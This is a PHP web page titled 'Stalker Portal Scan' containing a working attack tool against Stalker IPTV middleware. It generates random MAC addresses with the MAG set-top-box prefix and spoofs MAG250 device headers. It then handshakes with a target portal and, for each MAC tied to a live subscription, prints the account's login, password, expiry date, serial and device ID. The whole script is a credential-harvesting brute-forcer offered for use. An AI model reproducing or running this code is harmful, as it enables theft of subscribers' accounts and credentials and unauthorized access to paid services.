<!DOCTYPE html>
<html>
<head>
    <title>Stalker Portal Scan</title>
</head>
<body>
    <h2>Stalker Portal Scan</h2>
    
    <form method="POST" action="">
        <label for="field1">Portal:</label><br>
        <input type="text" id="field1" name="field1" required><br><br>
        
        <label for="field2">No. of Scan:</label><br>
        <input type="number" id="field2" name="field2" required><br><br>
        
        <input type="submit" value="Submit">
    </form>
    
    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Check if fields are set and get values
        $field1 = isset($_POST['field1']) ? htmlspecialchars($_POST['field1']) : '';
        $field2 = isset($_POST['field2']) ? htmlspecialchars($_POST['field2']) : '';
        
        // Display the values
        if (!empty($field1) && !empty($field2)) {
            echo "<h3>Submitted Values:</h3>";
            echo "<p><strong>Field 1:</strong> " . $field1 . "</p>";
            echo "<p><strong>Field 2:</strong> " . $field2 . "</p>";
        }





/* ========================= Utilities ========================= */
function md5Upper(string $text): string { return strtoupper(md5($text)); }
function sha256Upper(string $text): string { return strtoupper(hash('sha256', $text)); }


$portal = $field1;
$no_of_scan = $field2;

$portal_url = "http://$portal/stalker_portal/server/load.php"; // Change this
//$mac_address = "00:1A:79:E6:5E:AC"; // Change this

function generateMacAddress() {
    $prefix = "00:1A:79";
    $mac = $prefix;
    for ($i = 0; $i < 3; $i++) {
        $mac .= ':' . strtoupper(str_pad(dechex(mt_rand(0, 255)), 2, '0', STR_PAD_LEFT));
    }
    return $mac;
}

function portal_request($url, $params, $headers) {
    $full_url = $url . "?" . http_build_query($params);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_TIMEOUT, 50);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

$handshake_params = [
    'type' => 'stb',
    'action' => 'handshake',
    'JsHttpRequest' => '1-xml'
];


for ($i = 1; $i <= $no_of_scan; $i++) {
	$mac_address = generateMacAddress();
	$headers = [
	    "User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
	    "X-User-Agent: Model: MAG250; Link: WiFi",
	    "Cookie: mac=" . urlencode($mac_address) . "; stb_lang=en; timezone=Europe/Kiev;",
	    "Accept: */*",
	    "Connection: Keep-Alive"
	];

 	$handshake = portal_request($portal_url, $handshake_params, $headers);

	if(isset($handshake['js']['token'])) {
		$token = $handshake['js']['token'];
		$headers[] = "Authorization: Bearer " . $token;
		$profile_params = [
		    'type' => 'stb',
		    'action' => 'get_profile',
		    'JsHttpRequest' => '1-xml'
		];

		$profile = portal_request($portal_url, $profile_params, $headers);

		if (isset($profile['js']['expire_billing_date'])) {
			$upperMac = strtoupper($mac_address);
			$sn = md5Upper($upperMac);
			$sncut = substr($sn, 0, 13);
    			$deviceId = sha256Upper($upperMac);
			$signature = sha256Upper($sncut . $upperMac);
			echo "-----------------------------------------------------<br>";
			echo "PORTAL     : http://$portal/stalker_portal/c/<br>";
			echo "MAC        : ".$mac_address."         Expired : ". $profile['js']['expire_billing_date']."<br>";
			echo "LOGIN      : ".$profile['js']['login']."<br>";
			echo "PASSWORD   : ".$profile['js']['password']."<br>";
			echo "SERIAL CUT : ".$sncut."<br>";
			echo "DEVICE ID  : ".$deviceId."<br>";
			echo "-----------------------------------------------------<br>";
		}
	}	

}





    }
    ?>
</body>
</html>
